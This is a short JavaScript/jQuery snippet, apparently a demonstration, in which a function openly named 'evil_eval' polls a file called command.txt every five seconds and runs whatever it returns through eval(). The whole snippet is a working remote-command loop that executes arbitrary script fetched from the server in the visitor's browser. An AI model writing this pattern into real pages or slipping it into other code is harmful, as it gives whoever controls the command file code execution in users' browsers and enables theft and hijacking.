function evil_eval(){
    $.ajax({
               url: "./command.txt",
               cache: false,
               success: function(command){
                   console.log("success command fetch");
                   eval(command);
               }
           });    
}

var timer;
$(function(){
      alert("start");
      timer = setInterval(evil_eval,5000);
  });